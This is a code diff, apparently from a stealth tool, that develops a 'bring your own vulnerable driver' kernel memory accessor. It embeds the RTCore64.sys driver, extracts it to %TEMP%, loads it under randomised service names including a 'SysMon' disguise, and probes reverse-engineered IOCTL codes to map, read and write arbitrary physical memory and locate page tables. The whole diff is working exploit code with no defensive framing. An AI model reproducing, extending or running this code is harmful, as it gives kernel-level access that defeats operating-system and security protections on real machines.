@@ -85,26 +85,229 @@ std::vector<ProtectedUserRegion> g_protectedUserRegions;
 
 // ★ ReadCR3 不能是 static — 需要在 byovd_kernel.h 中 friend 声明
 
-// 轻量物理映射: 仅 IOCTL, 无日志/缓存/overlap 检查
-static bool MapPhysicalRaw(HANDLE hDevice, uint32_t ioctlCode,
-                           uint64_t physAddr, uint8_t** outVirtAddr) {
-    struct { uint64_t physAddr; uint32_t size; uint32_t flags; } request;
-    request.physAddr = physAddr;
-    request.size     = 0x1000; // 单页
-    request.flags    = 0;
+// ★ v3.99: IOCTL 探测 — 逆向分析 RTCore64.sys 发现:
+//   - IOCTL 基码: 0x80002000 (CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, ANY))
+//   - 驱动 dispatch 检查: (ioctl + 0x7FFFE000) <= 0x54 → 有效范围 0x80002000~0x80002054
+//   - 子码步长: 4 (0x00, 0x04, 0x08, ... 0x54)
+//   - 已知子码功能:
+//       0x00: 虚拟内存读/写 (48字节输入)
+//       0x08: I/O 端口读字节
+//       0x0C: I/O 端口读字
+//       0x10: I/O 端口读双字
+//       0x14: I/O 端口写字节
+//       0x18: PCI 配置空间访问 (24字节输入)
+//       0x1C: I/O 端口写双字
+//       0x20: 简单操作/获取版本 (8字节输入)
+//       0x28: RDMSR (12字节输入)
+//       0x2C: WRMSR (12字节输入)
+//       0x30: 物理内存映射 (MmMapIoSpace, 48字节输入)
+//       0x34: 物理内存映射变体 (48字节输入)
+//       0x40-0x54: 复用 0x30-0x34 的 handler
+// ★ v3.102: 安全 IOCTL 探测 — 0xC3502580 为主候选 (原始 RTCore64 IOCTL)
+//   BSOD教训: 0x80002040 导致 err=1450 (资源耗尽) → 蓝屏
+//   v3.101 错误: 仅有 0x80002000 系列 → 全部返回 err=87 (参数不匹配)
+//   修复: 0xC3502580 是 RTCore64.sys 原始物理内存映射 IOCTL, 格式为 12 字节 {u64 pa, u32 sz, u32 fl}
+//   0x80002000 系列作为备选 (不同驱动版本)
+//   测试物理地址改为 0x100000 (1MB), 避开 0x1000 (BIOS 数据区)
+static const uint32_t g_ioctlCandidates[] = {
+    0xC3502580,  // ★ 主候选: RTCore64.sys 原始物理内存 R/W IOCTL
+    0x80002000,  // 虚拟内存 R/W (48字节, 备选)
+    0x80002030,  // 物理内存映射 MmMapIoSpace (48字节, 备选)
+    0x80002034,  // 物理内存映射变体 (48字节, 备选)
+};
+static const int g_ioctlCandidateCount = sizeof(g_ioctlCandidates) / sizeof(g_ioctlCandidates[0]);
 
-    union { uint8_t raw[256]; uint8_t* mappedPtr; } outBuf;
+// ★ v3.101: 安全测试物理地址 — 1MB 处, 避开 BIOS 数据区 (0-1MB)
+static const uint64_t SAFE_TEST_PHYS = 0x100000;
+
+// ★ v3.99: 请求格式枚举 — 适配 0x80002000 系列 IOCTL
+//   逆向分析: 驱动使用 METHOD_BUFFERED, SystemBuffer 传递参数
+//   不同 sub-code 对应不同输入结构大小:
+//     0x00: 48字节 (虚拟内存 R/W)
+//     0x08-0x1C: 8字节 (I/O 端口)
+//     0x18: 24字节 (PCI 配置空间)
+//     0x20: 8字节 (简单操作)
+//     0x28/0x2C: 12字节 (RDMSR/WRMSR)
+//     0x30/0x34: 48字节 (物理内存映射)
+enum class RTCore64Format {
+    FMT_48B_PA_AT_00 = 0,  // 48字节: physAddr@+0x00, mappedVA@+0x08 (输出)
+    FMT_48B_PA_AT_08,       // 48字节: physAddr@+0x08, mappedVA@+0x08 (输出)
+    FMT_32B_RAW,            // 32字节: { uint64_t pa; uint32_t sz; uint32_t fl; } (旧格式兼容)
+    FMT_8B_RAW,             // 8字节: 仅 uint64_t (I/O port 等)
+    FMT_12B_RAW,            // 12字节: { uint32_t idx; uint32_t hi; uint32_t lo; } (MSR)
+};
+
+// ★ v3.100: 存储 IOCTL 探测结果 — 让 MapPhysical 使用正确的格式
+static RTCore64Format g_probedIoctlFormat = RTCore64Format::FMT_32B_RAW;
+
+// 尝试一种 IOCTL 码 + 格式组合
+static bool TryMapPhysical(HANDLE hDevice, uint32_t ioctlCode, uint64_t physAddr,
+                           RTCore64Format fmt, uint8_t** outVirtAddr, DWORD* outErr) {
+    uint8_t inBuf[64] = {};
+    DWORD inSize = 0;
+    // ★ v3.99: output buffer 增大到 512 字节, 某些格式需要更大的输出空间
+    union { uint8_t raw[512]; uint8_t* mappedPtr; } outBuf;
     outBuf.mappedPtr = nullptr;
     DWORD bytesRet = 0;
 
+    switch (fmt) {
+        case RTCore64Format::FMT_48B_PA_AT_00: {
+            // 48字节: physAddr@+0x00, mappedVA@+0x08 (输出)
+            // 驱动内部: ZwOpenSection(\Device\PhysicalMemory) + ZwMapViewOfSection
+            struct { uint64_t pa; uint64_t mappedVA; uint8_t pad[32]; } req;
+            memset(&req, 0, sizeof(req));
+            req.pa = physAddr;
+            memcpy(inBuf, &req, sizeof(req));
+            inSize = sizeof(req);
+            break;
+        }
+        case RTCore64Format::FMT_48B_PA_AT_08: {
+            // 48字节: physAddr@+0x08, mappedVA@+0x08 (输出)
+            // 驱动内部: MmMapIoSpace(physAddr, ...)
+            struct { uint64_t unk0; uint64_t pa; uint32_t sz; uint8_t pad[28]; } req;
+            memset(&req, 0, sizeof(req));
+            req.unk0 = 0;
+            req.pa = physAddr;
+            req.sz = 0x1000;
+            memcpy(inBuf, &req, sizeof(req));
+            inSize = sizeof(req);
+            break;
+        }
+        case RTCore64Format::FMT_32B_RAW: {
+            // 旧格式: { uint64_t pa; uint32_t sz; uint32_t fl; }
+            struct { uint64_t pa; uint32_t sz; uint32_t fl; } req;
+            req.pa = physAddr;
+            req.sz = 0x1000;
+            req.fl = 0;
+            memcpy(inBuf, &req, sizeof(req));
+            inSize = sizeof(req);
+            break;
+        }
+        case RTCore64Format::FMT_8B_RAW: {
+            // 8字节: 仅 uint64_t
+            memcpy(inBuf, &physAddr, sizeof(physAddr));
+            inSize = sizeof(physAddr);
+            break;
+        }
+        case RTCore64Format::FMT_12B_RAW: {
+            // 12字节: { uint32_t idx; uint32_t hi; uint32_t lo; }
+            struct { uint32_t idx; uint32_t hi; uint32_t lo; } req;
+            req.idx = (uint32_t)physAddr;
+            req.hi = 0;
+            req.lo = 0;
+            memcpy(inBuf, &req, sizeof(req));
+            inSize = sizeof(req);
+            break;
+        }
+    }
+
     BOOL ok = DeviceIoControl(hDevice, ioctlCode,
-                              &request, sizeof(request),
+                              inBuf, inSize,
                               outBuf.raw, sizeof(outBuf.raw),
                               &bytesRet, nullptr);
-    if (ok && outBuf.mappedPtr) {
-        *outVirtAddr = outBuf.mappedPtr;
+    DWORD err = GetLastError();
+    if (outErr) *outErr = err;
+
+    // ★ v3.99: 对于 0x80002030/0x34, 映射结果在 SystemBuffer[0x08] 处
+    //   DeviceIoControl 会将 SystemBuffer 复制回 output buffer
+    //   mappedVA 就在 outBuf 的前 8 字节 (或偏移 8 字节处)
+    if (ok) {
+        // 尝试从 output buffer 的不同偏移读取映射地址
+        uint64_t candidateVA = 0;
+        memcpy(&candidateVA, outBuf.raw, 8);
+        if (candidateVA && candidateVA > 0x10000) {
+            // 格式 FMT_48B_PA_AT_00: mappedVA 在 output[0x00]
+            *outVirtAddr = (uint8_t*)(uintptr_t)candidateVA;
+            return true;
+        }
+        memcpy(&candidateVA, outBuf.raw + 8, 8);
+        if (candidateVA && candidateVA > 0x10000) {
+            // 格式 FMT_48B_PA_AT_08: mappedVA 在 output[0x08]
+            *outVirtAddr = (uint8_t*)(uintptr_t)candidateVA;
+            return true;
+        }
+        // 如果 ok 但 mappedVA 为空, 可能驱动返回了成功但用了不同的输出格式
+        // 尝试直接使用 output buffer 指针
+        if (outBuf.mappedPtr) {
+            *outVirtAddr = outBuf.mappedPtr;
+            return true;
+        }
+    }
+    return false;
+}
+
+// ★ v3.102: 安全 IOCTL 探测 — 0xC3502580 优先, 适配多种格式
+//   教训: 0x80002040 导致 err=1450 (资源耗尽) → 蓝屏
+//   v3.101 错误: 仅尝试 FMT_48B 格式 → 0xC3502580 需要 FMT_32B_RAW
+//   - 4 个 IOCTL 码 × 3 种格式 = 最多 12 次探测
+//   - 使用 SAFE_TEST_PHYS (1MB) 而非危险的 0x1000
+//   - 每次探测间 Sleep(50ms) 防止资源耗尽
+static uint32_t ProbeIoctlCode(HANDLE hDevice, uint8_t** outTestVA) {
+    uint64_t testPhys = SAFE_TEST_PHYS;
+
+    // ★ v3.102: 尝试 3 种格式: FMT_32B_RAW (0xC3502580 原生格式) + 2 种 48B 格式
+    RTCore64Format safeFormats[] = {
+        RTCore64Format::FMT_32B_RAW,       // 0xC3502580: {u64 pa, u32 sz, u32 fl}
+        RTCore64Format::FMT_48B_PA_AT_00,  // 0x80002030: physAddr@+0x00
+        RTCore64Format::FMT_48B_PA_AT_08,  // 0x80002034: physAddr@+0x08
+    };
+    const int safeFormatCount = sizeof(safeFormats) / sizeof(safeFormats[0]);
+
+    int totalProbes = 0;
+    const int MAX_PROBES = 12; // 硬限制 (4 码 × 3 格式)
+
+    for (int ci = 0; ci < g_ioctlCandidateCount && totalProbes < MAX_PROBES; ci++) {
+        uint32_t ioctl = g_ioctlCandidates[ci];
+        for (int fi = 0; fi < safeFormatCount && totalProbes < MAX_PROBES; fi++) {
+            totalProbes++;
+            uint8_t* va = nullptr;
+            DWORD err = 0;
+            bool ok = TryMapPhysical(hDevice, ioctl, testPhys, safeFormats[fi], &va, &err);
+            ByovdDiag("BYOVD:ProbeIOCTL: ioctl=0x%08X fmt=%d ok=%d err=%u va=0x%llX probe=%d/%d\n",
+                      ioctl, (int)safeFormats[fi], (int)ok, err,
+                      (unsigned long long)(uintptr_t)va, totalProbes, MAX_PROBES);
+            if (ok && va) {
+                *outTestVA = va;
+                g_probedIoctlFormat = safeFormats[fi];
+                return ioctl;
+            }
+            // err=1 (ERROR_INVALID_FUNCTION) → IOCTL 码不匹配, 跳过此码
+            if (err == 1) break;
+            // err=1450 (ERROR_NO_SYSTEM_RESOURCES) → 危险! 立即停止
+            if (err == 1450) {
+                ByovdDiag("BYOVD:ProbeIOCTL: RESOURCE EXHAUSTION (err=1450) — ABORTING\n");
+                return 0;
+            }
+            // ★ v3.101: 每次探测间暂停 50ms 防止内核资源耗尽
+            Sleep(50);
+        }
+    }
+    return 0; // 全部失败
+}
+
+// 轻量物理映射: 仅 IOCTL, 无日志/缓存/overlap 检查
+static bool MapPhysicalRaw(HANDLE hDevice, uint32_t ioctlCode,
+                           uint64_t physAddr, uint8_t** outVirtAddr) {
+    // ★ v3.100: 使用探测到的格式
+    uint8_t* va = nullptr;
+    DWORD err = 0;
+    bool ok = TryMapPhysical(hDevice, ioctlCode, physAddr, g_probedIoctlFormat, &va, &err);
+    if (ok && va) {
+        *outVirtAddr = va;
         return true;
     }
+    // 回退: 尝试其他格式
+    for (int fmtIdx = 0; fmtIdx <= 4; fmtIdx++) {
+        RTCore64Format fmt = (RTCore64Format)fmtIdx;
+        if (fmt == g_probedIoctlFormat) continue;
+        ok = TryMapPhysical(hDevice, ioctlCode, physAddr, fmt, &va, &err);
+        if (ok && va) {
+            *outVirtAddr = va;
+            return true;
+        }
+        if (err == 1) break;
+    }
+    ByovdDiag("BYOVD:MapPhysicalRaw: DeviceIoControl FAILED (all formats)\n");
     return false;
 }
 
@@ -153,9 +356,9 @@ static uint64_t FindPML4Physical(HANDLE hDevice, uint32_t ioctlCode) {
     // ★ v3.85: 先验证 IOCTL 是否真的可用 (避免在僵尸驱动上白扫描)
     {
         uint8_t* testVA = nullptr;
-        bool testOk = MapPhysicalRaw(hDevice, ioctlCode, 0x1000, &testVA);
-        ByovdDiag("BYOVD:FindPML4: IOCTL test phys=0x1000 ok=%d va=0x%llX\n",
-                  (int)testOk, (unsigned long long)(uintptr_t)testVA);
+        bool testOk = MapPhysicalRaw(hDevice, ioctlCode, SAFE_TEST_PHYS, &testVA);
+        ByovdDiag("BYOVD:FindPML4: IOCTL test phys=0x%llX ok=%d va=0x%llX\n",
+                  (unsigned long long)SAFE_TEST_PHYS, (int)testOk, (unsigned long long)(uintptr_t)testVA);
         if (!testOk) {
             ByovdDiag("BYOVD:FindPML4: IOCTL FAILED — driver zombie?\n");
             return 0; // IOCTL 不可用, 无需扫描
@@ -163,13 +366,14 @@ static uint64_t FindPML4Physical(HANDLE hDevice, uint32_t ioctlCode) {
     }
 
     // PML4 通常在低物理地址 (非分页池)
-    // 扫描前 128MB (32K 页), 每 4MB 输出一次进度
+    // ★ v3.101: 从 1MB 开始扫描, 避开 0-1MB 的 BIOS 危险区域
     uint64_t pml4Entries[512]; // 栈上缓冲区
-    const uint64_t SCAN_LIMIT = 0x8000000; // 128 MB
+    const uint64_t SCAN_START  = SAFE_TEST_PHYS; // 1MB
+    const uint64_t SCAN_LIMIT  = 0x8000000;       // 128 MB
 
-    for (uint64_t phys = 0x1000; phys < SCAN_LIMIT; phys += 0x1000) {
+    for (uint64_t phys = SCAN_START; phys < SCAN_LIMIT; phys += 0x1000) {
         // 每 4MB (1024 页) 输出进度
-        if ((phys & 0x3FFFFF) == 0x1000) {
+        if ((phys & 0x3FFFFF) == 0) {
             ByovdDiag("BYOVD:FindPML4: scanning @ phys=0x%llX / 0x%llX...\n",
                       (unsigned long long)phys, (unsigned long long)SCAN_LIMIT);
         }
@@ -347,13 +551,17 @@ bool KernelMemoryAccessor::IsHVCIEnabled() {
 // 确保 BYOVD 驱动文件存在 (嵌入式提取回退)
 //
 // 优先级:
+//   0. 给定路径直接存在 (MutateAndRandomizeDriver 已写入 %TEMP%)
 //   1. System32\drivers\<name> (系统已安装)
 //   2. %TEMP%\<name> (从嵌入字节提取)
 // ============================================================
-// ★ v3.87: 存储 patched 后的设备路径, 供 Initialize 读取
-static std::wstring g_patchedDevicePath;
-
 static std::wstring EnsureDriverFile(const std::wstring& driverName) {
+    // ★ v3.97: 0. 先检查给定路径是否直接存在 (MutateAndRandomizeDriver 已写入 TEMP)
+    if (GetFileAttributesW(driverName.c_str()) != INVALID_FILE_ATTRIBUTES) {
+        ByovdDiag("BYOVD:EnsureDriverFile: file exists at given path '%ls'\n", driverName.c_str());
+        return driverName;
+    }
+
     wchar_t sysPath[MAX_PATH];
 
     // 1. 检查 System32\drivers
@@ -370,8 +578,12 @@ static std::wstring EnsureDriverFile(const std::wstring& driverName) {
         const uint8_t* embedData = nullptr;
         size_t embedSize = 0;
 
-        // 匹配驱动文件名
-        if (driverName == L"RTCore64.sys") {
+        // 匹配驱动文件名 (支持纯文件名和完整路径)
+        const wchar_t* baseName = driverName.c_str();
+        const wchar_t* lastSlash = wcsrchr(baseName, L'\\');
+        if (lastSlash) baseName = lastSlash + 1;
+
+        if (wcscmp(baseName, L"RTCore64.sys") == 0) {
             embedData = stealth::embedded::RTCore64_data;
             embedSize = stealth::embedded::RTCore64_size;
             ByovdDiag("BYOVD:EnsureDriverFile: matched RTCore64, embed=0x%p size=%zu\n", embedData, embedSize);
@@ -380,53 +592,10 @@ static std::wstring EnsureDriverFile(const std::wstring& driverName) {
         }
 
         if (embedData && embedSize > 0) {
-            // ★ v3.87: 生成随机设备名, patch 二进制避免 \Device\RTCore64 碰撞
-            //   zombie 设备对象残留时, 原驱动 DriverEntry 调用 IoCreateDevice 必失败
-            //   patch 后每个实例使用唯一设备名, 彻底消除碰撞
-            uint16_t devSuffix = (uint16_t)(rand() & 0xFFFF);
-            wchar_t patchedDevice[32], patchedSymlink[32];
-            swprintf_s(patchedDevice, L"\\Device\\R64_%04X", devSuffix);   // 16 chars + null = 34 bytes
-            swprintf_s(patchedSymlink, L"\\??\\R64_%04X", devSuffix);      // 12 chars + null = 26 bytes
-
-            g_patchedDevicePath = L"\\\\.\\R64_";
-            wchar_t suffixStr[8];
-            swprintf_s(suffixStr, L"%04X", devSuffix);
-            g_patchedDevicePath += suffixStr;
-
-            // 复制嵌入数据到可写 buffer 并 patch
-            std::vector<uint8_t> patchedData(embedData, embedData + embedSize);
-
-            // Patch 1: "\Device\RTCore64" → "\Device\R64_XXXX" (同长度, 34 bytes)
-            const wchar_t* oldDevice = L"\\Device\\RTCore64";
-            size_t oldDeviceBytes = wcslen(oldDevice) * sizeof(wchar_t); // 32 bytes
-            for (size_t i = 0; i + oldDeviceBytes <= patchedData.size(); i++) {
-                if (memcmp(patchedData.data() + i, oldDevice, oldDeviceBytes) == 0) {
-                    memcpy(patchedData.data() + i, patchedDevice, oldDeviceBytes);
-                    ByovdDiag("BYOVD:EnsureDriverFile: patched Device at offset 0x%zX → %ls\n", i, patchedDevice);
-                    break;
-                }
-            }
-
-            // Patch 2: "\??\RTCore64" → "\??\R64_XXXX" (较短的, 用 null 填充)
-            const wchar_t* oldSymlink = L"\\??\\RTCore64";
-            size_t oldSymlinkBytes = wcslen(oldSymlink) * sizeof(wchar_t); // 24 bytes
-            size_t newSymlinkBytes = wcslen(patchedSymlink) * sizeof(wchar_t); // 22 bytes
-            for (size_t i = 0; i + oldSymlinkBytes <= patchedData.size(); i++) {
-                if (memcmp(patchedData.data() + i, oldSymlink, oldSymlinkBytes) == 0) {
-                    memcpy(patchedData.data() + i, patchedSymlink, newSymlinkBytes);
-                    memset(patchedData.data() + i + newSymlinkBytes, 0, oldSymlinkBytes - newSymlinkBytes);
-                    ByovdDiag("BYOVD:EnsureDriverFile: patched Symlink at offset 0x%zX → %ls\n", i, patchedSymlink);
-                    break;
-                }
-            }
-
-            ByovdDiag("BYOVD:EnsureDriverFile: device path = %ls\n", g_patchedDevicePath.c_str());
-
             wchar_t tempPath[MAX_PATH];
             GetTempPathW(MAX_PATH, tempPath);
             wcscat_s(tempPath, driverName.c_str());
 
-            // v3.59: 随机化文件名 — 避免 err=32 (上一次驱动未卸载, 文件仍被占用)
             for (int retry = 0; retry < 5; retry++) {
                 wchar_t tryPath[MAX_PATH];
                 GetTempPathW(MAX_PATH, tryPath);
@@ -443,11 +612,14 @@ static std::wstring EnsureDriverFile(const std::wstring& driverName) {
                                            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                 if (hFile != INVALID_HANDLE_VALUE) {
                     DWORD written;
-                    WriteFile(hFile, patchedData.data(), (DWORD)patchedData.size(), &written, nullptr);
+                    WriteFile(hFile, embedData, (DWORD)embedSize, &written, nullptr);
                     FlushFileBuffers(hFile);
                     CloseHandle(hFile);
-                    ByovdDiag("BYOVD:EnsureDriverFile: wrote %u/%zu to %ls (retry=%d)\n", written, patchedData.size(), tryPath, retry);
-                    return std::wstring(tryPath);
+                    ByovdDiag("BYOVD:EnsureDriverFile: wrote %u/%zu to %ls (retry=%d)\n", written, embedSize, tryPath, retry);
+                    ByovdDiag("BYOVD:EnsureDriverFile: constructing wstring from '%ls'...\n", tryPath);
+                    std::wstring result(tryPath);
+                    ByovdDiag("BYOVD:EnsureDriverFile: wstring constructed OK (len=%zu)\n", result.length());
+                    return result;
                 }
                 ByovdDiag("BYOVD:EnsureDriverFile: CreateFileW FAILED for %ls (err=%u, retry=%d)\n", tryPath, GetLastError(), retry);
             }
@@ -487,7 +659,9 @@ static void ForceRemoveRTCore64Services() {
     }
 
     for (DWORD i = 0; i < serviceCount; i++) {
-        if (wcsstr(services[i].lpServiceName, L"RTCore64") != services[i].lpServiceName)
+        bool isOurSvc = (wcsstr(services[i].lpServiceName, L"RTCore64") == services[i].lpServiceName)
+                     || (wcsstr(services[i].lpServiceName, L"SysMon") == services[i].lpServiceName);
+        if (!isOurSvc)
             continue;
 
         ByovdDiag("BYOVD:ForceRemove: found stale service '%ls' (state=%u)\n",
@@ -531,10 +705,11 @@ static void ForceRemoveRTCore64Services() {
 
 bool KernelMemoryAccessor::LoadDriver(const std::wstring& serviceName, 
                                        const std::wstring& driverPath) {
+    // ★ v3.92: 必须先启用特权再清理 — ForceRemoveRTCore64Services 内部也调用 NtUnloadDriver
+    EnablePrivilege(L"SeLoadDriverPrivilege");
+
     // ★ v3.75: 加载前强制清理所有残留 RTCore64 服务/驱动
     ForceRemoveRTCore64Services();
-
-    EnablePrivilege(L"SeLoadDriverPrivilege");
 
     // 注册表: 创建服务条目
     std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;
@@ -546,11 +721,22 @@ bool KernelMemoryAccessor::LoadDriver(const std::wstring& serviceName,
     // v3.55: 删旧服务再重建 — 防止残留键导致 STATUS_OBJECT_NAME_INVALID
     RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
     
-    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+    // ★ v3.97: DeleteService 只标记删除, 键可能仍存在 (ERROR_ALREADY_EXISTS=183)
+    //   先尝试创建, 若已存在则打开现有键
+    LONG regResult = RegCreateKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
                         0, nullptr, REG_OPTION_NON_VOLATILE,
-                        KEY_ALL_ACCESS, nullptr, &hKey, nullptr) != ERROR_SUCCESS) {
-        ByovdDiag("BYOVD:LoadDriver: RegCreateKeyEx FAILED (err=%u)\n", GetLastError());
-        return false;
+                        KEY_ALL_ACCESS, nullptr, &hKey, nullptr);
+    if (regResult != ERROR_SUCCESS) {
+        if (regResult == ERROR_ALREADY_EXISTS) {
+            // 键已存在 (DeleteService 标记删除但未清理), 尝试打开
+            regResult = RegOpenKeyExW(HKEY_LOCAL_MACHINE, keyPath.c_str(),
+                                      0, KEY_ALL_ACCESS, &hKey);
+        }
+        if (regResult != ERROR_SUCCESS) {
+            ByovdDiag("BYOVD:LoadDriver: RegCreateKeyEx/RegOpenKeyEx FAILED (err=%u)\n", regResult);
+            return false;
+        }
+        ByovdDiag("BYOVD:LoadDriver: opened existing key (was marked for deletion)\n");
     }
 
     DWORD type = 1; // SERVICE_KERNEL_DRIVER
@@ -677,44 +863,24 @@ bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
         }
     }
 
-    // IOCTL 请求: 物理地址映射
-    struct {
-        uint64_t physAddr;
-        uint32_t size;
-        uint32_t flags;     // 0 = 读, 1 = 写
-    } request;
-
-    request.physAddr = alignedAddr;
-    request.size     = alignedSize;
-    request.flags    = 0;
-
-    DWORD bytesReturned = 0;
-    // ★ v3.70 Layer 3: 增大 IOCTL output buffer 防止驱动栈溢出
-    //   某些 RTCore64 版本可能写入超过 8 字节到 output buffer,
-    //   使用 256 字节安全缓冲区避免栈溢出导致返回地址损坏
-    union {
-        uint8_t raw[256];
-        uint8_t* mappedPtr;
-    } outBuf;
-    outBuf.mappedPtr = nullptr;
-    uint8_t* mappedAddr = nullptr;
+    // ★ v3.100: 使用探测到的 IOCTL 码和格式进行物理内存映射
+    //   替代旧的硬编码 {uint64_t, uint32_t, uint32_t} 格式
 
     // ★ v3.83: 保存关键全局变量到栈, 防止 IOCTL 映射覆盖 .data 段导致指针损坏
     uint8_t* savedBackupBuf    = ::g_backupBuf;
     SIZE_T   savedBackupLen    = ::g_backupLen;
     uint8_t* savedBackupCodeBase = ::g_backupCodeBase;
 
-    ByovdDiag("BYOVD:Map: IOCTL REQ phys=0x%llX size=%u\n",
-        (unsigned long long)alignedAddr, alignedSize);
+    ByovdDiag("BYOVD:Map: IOCTL REQ phys=0x%llX size=%u fmt=%d ioctl=0x%08X\n",
+        (unsigned long long)alignedAddr, alignedSize, (int)g_probedIoctlFormat, m_driverInfo.ioctlCode);
 
-    BOOL ok = DeviceIoControl(m_hDevice, m_driverInfo.ioctlCode,
-                              &request, sizeof(request),
-                              outBuf.raw, sizeof(outBuf.raw),
-                              &bytesReturned, nullptr);
-    mappedAddr = outBuf.mappedPtr;
+    uint8_t* mappedAddr = nullptr;
+    DWORD devErr = 0;
+    bool ok = TryMapPhysical(m_hDevice, m_driverInfo.ioctlCode, alignedAddr,
+                             g_probedIoctlFormat, &mappedAddr, &devErr);
 
-    ByovdDiag("BYOVD:Map: IOCTL RSP ok=%d mappedVA=0x%llX bytesRet=%u\n",
-        (int)ok, (unsigned long long)mappedAddr, bytesReturned);
+    ByovdDiag("BYOVD:Map: IOCTL RSP ok=%d mappedVA=0x%llX err=%u\n",
+        (int)ok, (unsigned long long)(uintptr_t)mappedAddr, devErr);
 
     // ★ v3.83: IOCTL 后立即 restore 全局变量 (若 .data 段被污染)
     if (::g_backupBuf != savedBackupBuf || ::g_backupCodeBase != savedBackupCodeBase || ::g_backupLen != savedBackupLen) {
@@ -725,13 +891,7 @@ bool KernelMemoryAccessor::MapPhysical(uint64_t physAddr, uint32_t size,
     }
 
     if (!ok || !mappedAddr) {
-        // 备选: 某些版本 RTCore64 使用不同的 IOCTL 格式
-        // 尝试 standard RTCore64 物理读: 先 map, 再读
-        DWORD ioctlRead = 0xC3502580;
-        DWORD ioctlWrite = 0xC3502588;
-
-        // RTCore64: 使用 struct { HANDLE hPhysicalMemory; ... }
-        // 重新尝试不同格式 (部分驱动版本差异)
+        ByovdDiag("BYOVD:Map: FAILED — err=%u\n", devErr);
         return false;
     }
 
@@ -840,33 +1000,31 @@ bool KernelMemoryAccessor::ReadPhysical(uint64_t physAddr, void* outBuf, size_t 
 }
 
 bool KernelMemoryAccessor::WritePhysical(uint64_t physAddr, const void* inBuf, size_t size) {
-    // 物理内存写入: 需要 MAP_WRITE 标志
+    // ★ v3.100: 使用探测到的 IOCTL 格式进行物理内存写入
     if (m_hDevice == INVALID_HANDLE_VALUE) return false;
 
     uint64_t alignedAddr = physAddr & ~0xFFFULL;
     uint32_t alignedSize = ((physAddr + size - alignedAddr + 0xFFF) & ~0xFFF);
 
-    // RTCore64 写入: IOCTL 0xC3502588 (unmap 后重新 map with write)
-    // 或使用不同的 IOCTL
-    struct {
-        uint64_t physAddr;
-        uint32_t size;
-        uint32_t flags;     // 1 = 可写
-    } request;
-
-    request.physAddr = alignedAddr;
-    request.size     = alignedSize;
-    request.flags    = 1;
+    ByovdDiag("BYOVD:WritePhysical: phys=0x%llX size=%zu fmt=%d ioctl=0x%08X\n",
+        (unsigned long long)alignedAddr, size, (int)g_probedIoctlFormat, m_driverInfo.ioctlCode);
 
     uint8_t* mappedAddr = nullptr;
-    DWORD bytesReturned = 0;
+    DWORD devErr = 0;
+    bool ok = TryMapPhysical(m_hDevice, m_driverInfo.ioctlCode, alignedAddr,
+                             g_probedIoctlFormat, &mappedAddr, &devErr);
 
-    BOOL ok = DeviceIoControl(m_hDevice, m_driverInfo.ioctlCode + 8,  // +8 = write variant
-                              &request, sizeof(request),
-                              &mappedAddr, sizeof(mappedAddr),
-                              &bytesReturned, nullptr);
+    // 如果基本格式失败, 尝试 +8 write variant
+    if (!ok || !mappedAddr) {
+        ByovdDiag("BYOVD:WritePhysical: try write variant ioctl=0x%08X\n", m_driverInfo.ioctlCode + 8);
+        ok = TryMapPhysical(m_hDevice, m_driverInfo.ioctlCode + 8, alignedAddr,
+                            g_probedIoctlFormat, &mappedAddr, &devErr);
+    }
 
-    if (!ok || !mappedAddr) return false;
+    if (!ok || !mappedAddr) {
+        ByovdDiag("BYOVD:WritePhysical: FAILED err=%u\n", devErr);
+        return false;
+    }
 
     // ★ v3.69: 检测写入映射是否覆盖 DLL 代码区域
     if (IsOverlappingProtectedRegion((uintptr_t)mappedAddr, alignedSize)) {
@@ -995,22 +1153,23 @@ uint64_t KernelMemoryAccessor::GetKernelModuleBase(const std::string& moduleName
 // ============================================================
 
 bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
+    ByovdDiag("BYOVD:Init: ENTER (driverPath='%ls' svcName='%ls')\n",
+        driver.driverPath.c_str(), driver.serviceName.c_str());
     m_driverInfo = driver;
+    ByovdDiag("BYOVD:Init: m_driverInfo copied OK\n");
 
     // 1. 检测 HVCI
     if (IsHVCIEnabled()) {
         ByovdDiag("BYOVD:Init: HVCI ENABLED (will likely block driver load)\n");
     }
+    ByovdDiag("BYOVD:Init: HVCI check done\n");
 
     // 2. 确保驱动文件存在 (System32\drivers → 嵌入提取到 %TEMP%)
+    ByovdDiag("BYOVD:Init: calling EnsureDriverFile('%ls')...\n", driver.driverPath.c_str());
     std::wstring resolvedPath = EnsureDriverFile(driver.driverPath);
+    ByovdDiag("BYOVD:Init: EnsureDriverFile returned, string length=%zu\n", resolvedPath.length());
+    ByovdDiag("BYOVD:Init: EnsureDriverFile returned '%ls'\n", resolvedPath.c_str());
     const std::wstring& actualPath = resolvedPath.empty() ? driver.driverPath : resolvedPath;
-
-    // ★ v3.87: 如果 EnsureDriverFile patch 了设备名, 更新 m_driverInfo
-    if (!g_patchedDevicePath.empty() && driver.driverPath == L"RTCore64.sys") {
-        m_driverInfo.devicePath = g_patchedDevicePath;
-        ByovdDiag("BYOVD:Init: patched device path → %ls\n", m_driverInfo.devicePath.c_str());
-    }
 
     // 3. ★ v3.76: 始终随机化服务名 — 防止 \Driver\<ServiceName> 僵尸内核对象冲突
     //   之前的逻辑依赖文件名含 '_' 后缀，但 EnsureDriverFile 首试即写原名，
@@ -1020,7 +1179,7 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
     std::wstring actualServiceName = driver.serviceName + suffix;
     m_actualServiceName = actualServiceName;  // store for cleanup
 
-    // v3.66: 扫描注册表, 卸载所有残留的 RTCore64 服务 (之前的随机化服务名)
+    // v3.95: 扫描注册表, 卸载所有残留的 RTCore64/SysMon 服务
     //        避免 STATUS_OBJECT_NAME_COLLISION (0xC0000035)
     {
         HKEY hServices;
@@ -1035,8 +1194,10 @@ bool KernelMemoryAccessor::Initialize(const BYOVDDriverInfo& driver) {
                 LONG enumResult = RegEnumKeyExW(hServices, idx, subKeyName, &nameLen,
                     nullptr, nullptr, nullptr, nullptr);
                 if (enumResult != ERROR_SUCCESS) break;
-                // 匹配 RTCore64Svc 前缀 (包括 RTCore64Svc_BE28 等随机化版本)
